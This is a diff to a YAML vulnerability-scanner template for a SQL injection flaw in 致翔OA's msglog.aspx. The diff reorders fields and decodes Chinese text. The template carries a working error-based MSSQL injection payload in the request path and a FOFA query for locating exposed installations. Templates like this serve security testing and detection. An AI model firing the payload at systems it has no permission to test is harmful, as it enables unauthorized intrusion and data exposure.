@@ -1,22 +1,23 @@
-expression: r0()
 id: zhixiang-oa-msglog-aspx-sql-inject
+
 info:
+  name: 致翔OA msglog.aspx SQL注入漏洞
   author: zan8in
-  description: "\u81F4\u7FD4OA msglog.aspx\u6587\u4EF6\u5B58\u5728SQL\u6CE8\u5165\u6F0F\
-    \u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u83B7\u53D6\u654F\
-    \u611F\u4FE1\u606F\u3002\nfofa\uFF1Aapp=\"\u81F4\u7FD4\u8F6F\u4EF6-\u81F4\u7FD4\
-    OA\"\n"
-  name: "\u81F4\u7FD4OA msglog.aspx SQL\u6CE8\u5165\u6F0F\u6D1E"
-  reference:
-  - https://mp.weixin.qq.com/s/wDiwf3QjUkYfKlOHL8G-Qg
   severity: high
   verified: false
+  description: |
+    致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息。
+    fofa：app="致翔软件-致翔OA"
+  reference:
+    - https://mp.weixin.qq.com/s/wDiwf3QjUkYfKlOHL8G-Qg
+
+set:
+  randstr: randomLowercase(28)
+  md5str: md5(randstr)
 rules:
   r0:
-    expression: response.status == 500 && response.body.bcontains(bytes(md5str))
     request:
       method: GET
       path: /mainpage/msglog.aspx?user=1'+and+(SELECT+sys.fn_sqlvarbasetostr(HashBytes('MD5',+'{{randstr}}')))%3d1+--
-set:
-  md5str: md5(randstr)
-  randstr: randomLowercase(28)
+    expression: response.status == 500 && response.body.bcontains(bytes(md5str))
+expression: r0()
